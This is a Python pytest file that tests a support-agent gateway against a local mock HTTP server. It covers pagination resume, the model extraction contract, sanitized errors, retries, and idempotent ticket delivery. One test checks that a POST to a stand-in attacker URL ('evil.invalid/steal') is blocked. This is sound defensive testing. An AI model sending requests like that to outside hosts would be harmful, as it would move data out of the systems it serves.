import json
import threading
import socket
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import pytest
from support_agent.adapters.providers import Gateway, BoundSource
from support_agent.settings import Settings
from support_agent.errors import Permanent, Transient, DeliveryUnknown
from support_agent.services.ingest.service import ingest_once
from support_agent.db.models import Cursor


@pytest.fixture
def server():
    state = {"requests": [], "creates": 0, "receipts": {}, "fail": None, "drop_after_create": False}

    class Handler(BaseHTTPRequestHandler):
        def log_message(self, *args):
            pass

        def do_POST(self):
            payload = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
            state["requests"].append((self.path, payload, self.headers.get("Idempotency-Key")))
            status, body = 200, {}
            if state["fail"]:
                status = state["fail"]
                body = {"error": "DO_NOT_LOG_PROVIDER_SECRET"}
            elif self.path.endswith("/changes"):
                seq = int(payload["cursor"] or "0")
                body = {
                    "changes": [
                        {
                            "sequence": seq + 1,
                            "external_id": f"h{seq + 1}",
                            "version": f"etag-{seq + 1}",
                            "operation": "upsert",
                            "changed_at": "2026-11-06T10:00:00Z",
                            "backfill": False,
                        }
                    ]
                    if seq < 3
                    else [],
                    "next_cursor": str(min(seq + 1, 3)),
                    "has_more": seq < 2,
                }
            elif self.path.endswith("/tickets/read"):
                body = {
                    "external_id": payload["ticket_id"],
                    "version": payload["version"],
                    "text": "Synthetic gateway input",
                    "channel": "text",
                    "occurred_at": "2026-11-06T09:00:00Z",
                    "attachments": [],
                    "duplicate_of": None,
                }
            elif self.path == "/v1/models/extract":
                body = {"output_json": '{"items":[]}', "usage": {"input_tokens": 12, "output_tokens": 3}}
            elif self.path == "/v1/backlog/lookup":
                body = {"external_id": state["receipts"].get(payload["key"])}
            elif self.path == "/v1/backlog/cards":
                key = payload["correlation_key"]
                if key not in state["receipts"]:
                    state["creates"] += 1
                    state["receipts"][key] = "external-" + str(state["creates"])
                body = {"external_id": state["receipts"][key]}
                if state["drop_after_create"]:
                    state["drop_after_create"] = False
                    self.connection.shutdown(socket.SHUT_RDWR)
                    self.connection.close()
                    return
            data = json.dumps(body).encode()
            self.send_response(status)
            self.send_header("Content-Type", "application/json")
            if status == 429:
                self.send_header("Retry-After", "3")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)

    http = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    thread = threading.Thread(target=http.serve_forever, daemon=True)
    thread.start()
    state["url"] = f"http://127.0.0.1:{http.server_port}"
    yield state
    http.shutdown()
    http.server_close()
    thread.join(timeout=2)


def gateway(server, **updates):
    settings = Settings(_env_file=None).model_copy(
        update={"gateway_url": server["url"], "gateway_token": "local-test-only", **updates}
    )
    return Gateway(settings, allow_loopback_for_test=True)


async def test_real_http_source_pagination_resume_and_model_contract(server, app):
    g = gateway(server)
    original = app.source
    app.source = lambda p: BoundSource(g, p)
    try:
        r = await ingest_once(app, "atlas")
        assert r == {"accepted": 3, "pages": 3}
        again = await ingest_once(app, "atlas")
        assert again["accepted"] == 0
        with app.db.tx(["atlas"]) as s:
            assert s.get(Cursor, ("atlas", "gateway")).position == "3"
        raw, usage = await g.extract([{"segment_id": "s", "text": "synthetic"}])
        assert json.loads(raw) == {"items": []}
        assert usage["input_tokens"] == 12
        request = server["requests"][-1][1]
        assert request["schema"]["additionalProperties"] is False
        assert request["prompt_version"] == "extraction-v1"
        assert "write-tools" in request["system"]
        with pytest.raises(Permanent):
            await g.request("POST", "https://evil.invalid/steal")
    finally:
        await g.close()
        app.source = original


@pytest.mark.parametrize(
    "status,error", [(429, Transient), (503, Transient), (400, Permanent), (302, Permanent)]
)
async def test_http_errors_are_sanitized_and_not_retried(server, status, error):
    server["fail"] = status
    g = gateway(server)
    try:
        with pytest.raises(error) as e:
            await g.extract([])
        assert len(server["requests"]) == 1
        assert "DO_NOT_LOG_PROVIDER_SECRET" not in str(e.value)
        if status == 429:
            assert e.value.retry_after == 3
    finally:
        await g.close()


async def test_timeout_after_creation_uses_correlation_lookup(server):
    server["drop_after_create"] = True
    g = gateway(server, backlog_lookup=True)
    try:
        with pytest.raises(Transient):
            await g.deliver("atlas", "key1", {"need": "synthetic"})
        result = await g.deliver("atlas", "key1", {"need": "synthetic"})
        assert result == "external-1"
        assert server["creates"] == 1
    finally:
        await g.close()


async def test_unsafe_receiver_stops_at_delivery_unknown(server):
    server["drop_after_create"] = True
    g = gateway(server)
    try:
        with pytest.raises(DeliveryUnknown):
            await g.deliver("atlas", "key2", {"need": "synthetic"})
        assert server["creates"] == 1
    finally:
        await g.close()
